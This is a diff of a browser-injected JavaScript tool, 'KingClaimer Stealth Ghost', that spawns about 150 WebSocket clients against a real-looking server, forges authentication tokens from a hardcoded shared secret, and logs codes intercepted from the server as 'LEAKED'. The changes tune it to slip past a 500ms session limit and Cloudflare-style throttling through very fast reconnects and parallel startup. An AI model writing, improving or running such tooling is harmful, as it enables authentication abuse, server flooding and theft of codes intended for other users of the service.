@@ -2,19 +2,18 @@
 // KING-CLAIMER STEALTH GHOST - SINGLE FILE WITH GUI
 // Save as claim.js and inject or use as userscript
 // ==========================================
-
 const SERVER_URL = "wss://kingclaimer.xyz:8443/";
-const TOTAL_CLIENTS = 200;
-const RECONNECT_DELAY = 450;
+const TOTAL_CLIENTS = 150;
+const RECONNECT_DELAY = 50;           // Very fast respawn
+const SESSION_LIFETIME = 480;         // ~480ms max per connection (under 500ms limit)
 const SHARED_SECRET = "vipxK9mP2vL8nQ4wRjT5bYc";
-
 let clients = [];
 let isRunning = false;
+let activeCount = 0;
 
 // Create GUI
 function createGUI() {
     if (document.getElementById('kingclaimer-gui')) return;
-
     const panel = document.createElement('div');
     panel.id = 'kingclaimer-gui';
     panel.style.cssText = `
@@ -22,7 +21,6 @@ function createGUI() {
         background: rgba(15,15,15,0.97); border: 2px solid #00ff00; border-radius: 8px;
         box-shadow: 0 0 25px #00ff00; z-index: 2147483647; overflow: hidden; font-family: monospace;
     `;
-
     panel.innerHTML = `
         <div style="background:#111; padding:12px; text-align:center; font-weight:bold; border-bottom:1px solid #00ff00;">
             🔥 KING-CLAIMER STEALTH GHOST 🔥
@@ -33,14 +31,12 @@ function createGUI() {
         </div>
         <div id="kc-log" style="height:460px; overflow-y:auto; padding:10px; background:#000; font-size:13px; line-height:1.5;"></div>
         <div style="padding:8px; text-align:center; background:#111; border-top:1px solid #00ff00; font-size:14px;">
-            Clients: <span id="kc-count">3</span> | Status: <span id="kc-status">Ready</span>
+            Active: <span id="kc-count">0</span> | Status: <span id="kc-status">Ready</span>
         </div>
     `;
-
     document.body.appendChild(panel);
 
     const logContainer = document.getElementById('kc-log');
-
     window.kcLog = function(message, type = 'info') {
         const entry = document.createElement('div');
         entry.style.margin = '2px 0';
@@ -91,36 +87,36 @@ async function generateHMACAuthToken(username) {
 }
 
 // ==========================================
-// STRESS CLIENT
+// STRESS CLIENT (Short-lived + Parallel)
 // ==========================================
 class StressClient {
     constructor(id) {
         this.clientID = id;
         this.username = null;
         this.ws = null;
-        this.connected = false;
         this.running = true;
-        this.failureCount = 0;
     }
 
     async connect() {
+        if (!this.running) return;
+
         this.username = generateRandomUsername();
         const authToken = await generateHMACAuthToken(this.username);
-
         const url = new URL(SERVER_URL);
         url.searchParams.set("username", this.username);
         url.searchParams.set("nonce", authToken);
 
-        log(`[Client ${this.clientID}] Attempting connection as ${this.username}`);
+        log(`[Client ${this.clientID}] Connecting as ${this.username}`);
 
         try {
             this.ws = new WebSocket(url.toString());
 
             this.ws.onopen = () => {
-                this.connected = true;
-                this.failureCount = 0;
-                log(`✅ [Client ${this.clientID}] Successfully connected as ${this.username}`, 'success');
-               
+                activeCount++;
+                document.getElementById('kc-count').textContent = activeCount;
+
+                log(`✅ [Client ${this.clientID}] Connected`, 'success');
+
                 const regPayload = {
                     type: "register",
                     role: "claimer",
@@ -128,74 +124,75 @@ class StressClient {
                 };
                 this.ws.send(JSON.stringify(regPayload));
 
-                // Dummy ping spam every 100ms to keep connection alive
-                setInterval(() => {
-                    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
+                // Short burst of pings
+                let pingCount = 0;
+                const pingInterval = setInterval(() => {
+                    if (this.ws && this.ws.readyState === WebSocket.OPEN && pingCount < 6) {
                         this.ws.send(JSON.stringify({ type: "ping" }));
+                        pingCount++;
+                    } else {
+                        clearInterval(pingInterval);
                     }
-                }, 100);
+                }, 60);
             };
 
             this.ws.onmessage = (event) => {
                 try {
                     const data = JSON.parse(event.data);
-
                     if (data.type === "ping") {
                         this.ws.send(JSON.stringify({ type: "pong" }));
                     }
-
                     if (data.code) {
                         log(`🔥 [LEAKED]: ${data.code} 🔥`, 'success');
-                        if (data.code === "NEW_DEVICE_CONNECTED") {
-                            log("⚠️ Kicked because the user connected elsewhere.", 'warn');
-                            this.disconnect();
-                        }
                     }
-
                     if (data.message === "Authentication failed" || data.code === "INVALID_USERNAME") {
-                        log("🛑 AUTH FAILED. Reconnecting...", 'error');
-                        this.disconnect();
+                        log(`🛑 [Client ${this.clientID}] Auth failed`, 'error');
                     }
                 } catch (e) {}
             };
 
             this.ws.onclose = () => {
-                this.connected = false;
-                this.failureCount++;
-
-                if (this.failureCount > 100) {
-                    log(`[Client ${this.clientID}] 100+ failures → Refreshing page...`, 'error');
-                    setTimeout(() => location.reload(), 800);
-                    return;
-                }
-
+                activeCount = Math.max(0, activeCount - 1);
+                document.getElementById('kc-count').textContent = activeCount;
+                this.cleanup();
                 if (this.running) {
-                    log(`[Client ${this.clientID}] Disconnected → Reconnecting... (Failures: ${this.failureCount})`, 'warn');
                     setTimeout(() => this.connect(), RECONNECT_DELAY);
                 }
             };
 
             this.ws.onerror = () => {
-                this.failureCount++;
-                log(`⚠️ [Client ${this.clientID}] WebSocket Error (Failures: ${this.failureCount})`, 'error');
+                this.cleanup();
+                if (this.running) {
+                    setTimeout(() => this.connect(), RECONNECT_DELAY);
+                }
             };
 
+            // Force close after SESSION_LIFETIME to stay under 500ms
+            setTimeout(() => {
+                if (this.ws && this.ws.readyState === WebSocket.OPEN) {
+                    this.ws.close();
+                }
+            }, SESSION_LIFETIME);
+
         } catch (e) {
-            this.failureCount++;
-            log(`⚠️ [Client ${this.clientID}] Failed to start (Failures: ${this.failureCount})`, 'error');
-            
-            if (this.failureCount > 100) {
-                log(`100+ failures → Refreshing page...`, 'error');
-                setTimeout(() => location.reload(), 800);
-                return;
+            this.cleanup();
+            if (this.running) {
+                setTimeout(() => this.connect(), RECONNECT_DELAY);
             }
-            if (this.running) setTimeout(() => this.connect(), RECONNECT_DELAY);
         }
     }
 
-    disconnect() {
-        if (this.ws) this.ws.close();
-        this.connected = false;
+    cleanup() {
+        if (this.ws) {
+            this.ws.onopen = null;
+            this.ws.onmessage = null;
+            this.ws.onclose = null;
+            this.ws.onerror = null;
+            if (this.ws.readyState === WebSocket.OPEN || this.ws.readyState === WebSocket.CONNECTING) {
+                this.ws.close();
+            }
+            this.ws = null;
+        }
     }
 }
 
@@ -206,12 +203,16 @@ async function startGhost() {
     if (isRunning) return;
     isRunning = true;
     clients = [];
-    log("🚀 Starting KingClaimer Stealth Ghost (Gradual Connection)...", 'success');
+    activeCount = 0;
+    document.getElementById('kc-count').textContent = "0";
+    log("🚀 Starting KingClaimer Stealth Ghost (Parallel Mode)...", 'success');
 
+    // Much more parallel startup
     for (let i = 0; i < TOTAL_CLIENTS; i++) {
         const client = new StressClient(i);
         clients.push(client);
-        setTimeout(() => client.connect(), i * 1200); // Slower gradual start to avoid CF
+        // Very small stagger to avoid browser throttling
+        setTimeout(() => client.connect(), i * 8);
     }
 }
 
@@ -219,8 +220,10 @@ function stopGhost() {
     isRunning = false;
     clients.forEach(client => {
         client.running = false;
-        client.disconnect();
+        client.cleanup();
     });
+    activeCount = 0;
+    document.getElementById('kc-count').textContent = "0";
     log("⛔ All clients stopped.", 'error');
 }
 
@@ -228,6 +231,6 @@ function stopGhost() {
 createGUI();
 setTimeout(() => {
     startGhost();
-}, 1000);
+}, 800);
 
-console.log("%c✅ KingClaimer Ghost loaded with GUI", "color:#00ff00; font-weight:bold");
+console.log("%c✅ KingClaimer Ghost loaded with GUI (Fixed Parallel + Short-lived)", "color:#00ff00; font-weight:bold");
